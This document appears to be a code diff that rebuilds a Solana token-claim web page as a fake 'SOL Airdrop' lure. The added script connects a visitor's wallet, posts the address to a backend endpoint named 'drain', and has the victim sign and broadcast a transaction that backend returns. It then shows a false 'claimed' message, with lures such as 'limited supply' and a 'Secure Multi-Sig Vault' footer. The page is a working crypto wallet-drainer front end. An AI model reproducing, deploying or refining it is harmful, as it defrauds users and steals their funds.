@@ -3,179 +3,361 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Token Claim Portal</title>
+    <title>SOL Drop | Exclusive Token Claim</title>
+    
+    <!-- Solana Web3 SDK -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    
+    <!-- Google Fonts: Inter for clean UI, Orbitron for crypto vibe -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+
     <style>
         :root {
-            --bg-color: #0d0d0d;
-            --card-bg: #1a1a1a;
-            --primary-color: #9945ff; /* Solana Purple */
-            --secondary-color: #14f195; /* Solana Green */
-            --text-color: #ffffff;
-            --text-muted: #a0a0a0;
-            --error-color: #ff4444;
-            --success-color: #00C851;
+            --bg-dark: #0f0b1a;
+            --bg-card: #1a1429;
+            --solana-purple: #9945FF;
+            --solana-green: #14F195;
+            --text-main: #ffffff;
+            --text-muted: #b3b3b3;
+            --glow: 0 0 20px rgba(153, 69, 255, 0.5);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             min-height: 100vh;
-            background-image: radial-gradient(circle at 50% 50%, #2a2a2a 0%, #0d0d0d 100%);
-        }
-
-        .container {
-            background-color: var(--card-bg);
-            padding: 2rem;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-            border: 1px solid #333;
-        }
-
-        .logo {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 1rem;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            border-radius: 50%;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            font-weight: bold;
-            font-size: 24px;
-            color: #000;
-            margin: 0 auto 1rem auto;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Background Effects */
+        .bg-gradient {
+            position: absolute;
+            top: -20%;
+            left: -10%;
+            width: 50%;
+            height: 50%;
+            background: radial-gradient(circle, rgba(153, 69, 255, 0.15) 0%, transparent 70%);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .bg-gradient-2 {
+            position: absolute;
+            bottom: -20%;
+            right: -10%;
+            width: 60%;
+            height: 60%;
+            background: radial-gradient(circle, rgba(20, 241, 149, 0.1) 0%, transparent 70%);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        /* Container */
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        /* Logo Area */
+        .logo-area {
+            margin-bottom: 30px;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        .solana-logo-svg {
+            width: 80px;
+            height: 80px;
+            fill: url(#gradient);
+            filter: drop-shadow(0 0 10px rgba(153, 69, 255, 0.6));
         }
 
         h1 {
-            font-size: 1.5rem;
-            margin: 0 0 0.5rem 0;
-            font-weight: 600;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #fff, var(--solana-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        p {
+        p.subtitle {
             color: var(--text-muted);
             font-size: 0.95rem;
             line-height: 1.5;
-            margin-bottom: 1.5rem;
+            margin-bottom: 30px;
         }
 
-        .btn-connect {
-            background: linear-gradient(90deg, var(--primary-color), #6a30a6);
-            color: white;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.1s ease, box-shadow 0.2s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .btn-connect:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
-        }
-
-        .btn-connect:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        /* Status Box */
+        .status-container {
+            margin-bottom: 20px;
+            min-height: 24px;
         }
 
         .status {
-            margin-top: 1.5rem;
-            padding: 1rem;
-            border-radius: 8px;
             font-size: 0.9rem;
-            display: none;
-            word-break: break-word;
+            padding: 10px;
+            border-radius: 8px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
 
-        .status.visible {
-            display: block;
+        .status.visible { opacity: 1; }
+        .status.loading { color: var(--solana-green); background: rgba(20, 241, 149, 0.1); border: 1px solid var(--solana-green); }
+        .status.error { color: #ff4d4d; background: rgba(255, 77, 77, 0.1); border: 1px solid #ff4d4d; }
+        .status.success { color: var(--solana-green); background: rgba(20, 241, 149, 0.1); border: 1px solid var(--solana-green); }
+
+        /* Main Button */
+        .claim-btn {
+            background: linear-gradient(135deg, var(--solana-purple), #7c3aed);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: var(--glow);
+            transition: transform 0.2s, box-shadow 0.2s;
+            position: relative;
+            overflow: hidden;
         }
 
-        .status.loading {
-            background-color: rgba(153, 69, 255, 0.1);
-            color: var(--primary-color);
-            border: 1px solid rgba(153, 69, 255, 0.2);
+        .claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(153, 69, 255, 0.8);
         }
 
-        .status.success {
-            background-color: rgba(20, 241, 149, 0.1);
-            color: var(--secondary-color);
-            border: 1px solid rgba(20, 241, 149, 0.2);
+        .claim-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
 
-        .status.error {
-            background-color: rgba(255, 68, 68, 0.1);
-            color: var(--error-color);
-            border: 1px solid rgba(255, 68, 68, 0.2);
+        /* NFT/Token Visuals */
+        .token-grid {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 40px;
+            opacity: 0.8;
         }
 
-        .status.warning {
-            background-color: rgba(255, 165, 0, 0.1);
-            color: orange;
-            border: 1px solid rgba(255, 165, 0, 0.2);
+        .token-card {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
         }
 
-        .wallet-address {
-            margin-top: 0.5rem;
+        .token-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #ccc;
+        }
+
+        /* Animations */
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        /* Footer */
+        footer {
+            margin-top: 40px;
             font-size: 0.8rem;
-            color: var(--text-muted);
-            font-family: monospace;
-        }
-
-        /* Phantom Icon */
-        .phantom-icon {
-            width: 20px;
-            height: 20px;
-            background-color: #fff;
-            border-radius: 4px;
+            color: #666;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Logo/Icon -->
-        <div class="logo">S</div>
-        
-        <h1>Solana Token Claim</h1>
-        <p>Connect your Phantom wallet to verify eligibility and claim your allocated tokens securely.</p>
+    <!-- SVG Gradient Definition for Logo -->
+    <svg width="0" height="0">
+        <defs>
+            <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:#9945FF;stop-opacity:1" />
+                <stop offset="100%" style="stop-color:#14F195;stop-opacity:1" />
+            </linearGradient>
+        </defs>
+    </svg>
 
-        <!-- Button -->
-        <button id="connect-wallet" class="btn-connect">
-            <span>Connect Phantom</span>
+    <div class="bg-gradient"></div>
+    <div class="bg-gradient-2"></div>
+
+    <div class="container">
+        <div class="logo-area">
+            <!-- Solana Logo SVG -->
+            <svg class="solana-logo-svg" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <path d="M4.95 14.15l-.65.65c-.45.45-.45 1.15 0 1.6l2.85 2.85c.45.45 1.15.45 1.6 0l.65-.65L12.1 16l-4.15-4.15H4.95zm22.1 0l.65-.65c.45-.45.45-1.15 0-1.6l-2.85-2.85c-.45-.45-1.15-.45-1.6 0l-.65.65L19.9 16l4.15 4.15h7.15zM4.95 17.85l-.65-.65c-.45-.45-.45-1.15 0-1.6l2.85-2.85c.45-.45 1.15-.45 1.6 0l.65.65L12.1 16l-4.15 4.15H4.95z"/>
+                <path d="M12.1 12.1l4.15-4.15L12.1 3.8l-4.15 4.15h4.15zm7.8 0l4.15-4.15L20.2 3.8l4.15 4.15h-4.15z"/>
+            </svg>
+        </div>
+
+        <h1>SOL Airdrop Event</h1>
+        <p class="subtitle">
+            Verify your wallet eligibility to claim your exclusive allocation of $SOL-MEME and USDC rewards. 
+            <br><strong>Limited supply available.</strong>
+        </p>
+
+        <div class="status-container">
+            <div id="status" class="status"></div>
+        </div>
+
+        <button id="connect-wallet" class="claim-btn">
+            Connect Wallet & Claim
         </button>
 
-        <!-- Status Messages -->
-        <div id="status" class="status"></div>
-        
-        <!-- Wallet Address (Optional, shown after connect) -->
-        <div id="wallet-address" class="wallet-address"></div>
+        <div class="token-grid">
+            <div class="token-card"><div class="token-icon" style="background: #000;"></div></div>
+            <div class="token-card"><div class="token-icon" style="background: #2775CA;"></div></div>
+            <div class="token-card"><div class="token-icon" style="background: #E6007A;"></div></div>
+            <div class="token-card"><div class="token-icon" style="background: #F0B90B;"></div></div>
+        </div>
+
+        <footer>
+            Powered by Solana Network • Secure Multi-Sig Vault
+        </footer>
     </div>
 
-    <!-- Solana Web3.js Library -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script>
+        // --- Configuration ---
+        const BACKEND_URL = '/.netlify/functions/drain'; // Ensure this matches your Netlify function path
 
-    <!-- Your Script -->
-    <script src="scripts.js"></script>
+        // --- DOM Elements ---
+        const statusElement = document.getElementById('status');
+        const button = document.getElementById('connect-wallet');
 
+        // --- Helper Functions ---
+        function setStatus(message, type) {
+            statusElement.textContent = message;
+            statusElement.className = `status visible ${type}`;
+        }
+
+        function clearStatus() {
+            statusElement.className = 'status';
+        }
+
+        // --- Main Logic ---
+        async function handleClaim() {
+            // Reset UI
+            button.disabled = true;
+            button.textContent = "Initializing...";
+            clearStatus();
+
+            // 1. Detect Wallet Provider
+            const provider = window.phantom?.solana || window.solana;
+
+            if (!provider || !provider.isPhantom && !provider.isSolflare && !provider.isBackpack) {
+                setStatus('Wallet not detected. Please install Phantom, Solflare, or Backpack.', 'error');
+                button.disabled = false;
+                button.textContent = "Try Again";
+                return;
+            }
+
+            try {
+                // 2. Connect Wallet
+                setStatus('Connecting to wallet...', 'loading');
+                
+                // Check if already connected or connect fresh
+                if (!provider.publicKey) {
+                    await provider.connect({ onlyIfTrusted: false });
+                }
+
+                if (!provider.publicKey) {
+                    throw new Error("User rejected connection.");
+                }
+
+                const walletAddress = provider.publicKey.toString();
+                
+                // 3. Fetch Transaction from Backend
+                setStatus('Verifying eligibility on-chain...', 'loading');
+                
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || 'Failed to fetch transaction.');
+                }
+
+                const result = await response.json();
+
+                // 4. Deserialize Transaction
+                setStatus('Preparing transaction data...', 'loading');
+                
+                let transaction;
+                try {
+                    // Try Versioned first (Modern)
+                    const transactionBytes = Uint8Array.from(atob(result.transaction), c => c.charCodeAt(0));
+                    transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
+                } catch (e) {
+                    // Fallback to Legacy
+                    const legacyBytes = Uint8Array.from(atob(result.transaction), c => c.charCodeAt(0));
+                    transaction = solanaWeb3.Transaction.fromBuffer(legacyBytes);
+                }
+
+                // 5. Sign Transaction
+                setStatus('Please sign in your wallet...', 'loading');
+                
+                // Note: Phantom/Solflare/Backpack all expose signTransaction similarly
+                const signedTransaction = await provider.signTransaction(transaction);
+
+                // 6. Send Transaction
+                setStatus('Sending to network...', 'loading');
+                const signature = await provider.sendTransaction(signedTransaction);
+
+                // 7. Confirm
+                setStatus('Confirming block confirmation...', 'loading');
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+                
+                // Wait for confirmation
+                await connection.confirmTransaction(signature);
+
+                // 8. Success
+                setStatus(`Success! ${result.amount} ${result.tokenSymbol} claimed.`, 'success');
+                button.textContent = "Claimed";
+                button.style.background = "#14F195";
+                button.style.color = "#000";
+
+            } catch (err) {
+                console.error(err);
+                // Handle specific user rejections vs errors
+                const msg = err.message.includes('rejected') ? 'Transaction cancelled.' : `Error: ${err.message}`;
+                setStatus(msg, 'error');
+                button.disabled = false;
+                button.textContent = "Try Again";
+            }
+        }
+
+        // Attach Listener
+        document.getElementById('connect-wallet').addEventListener('click', handleClaim);
+
+    </script>
 </body>
 </html>
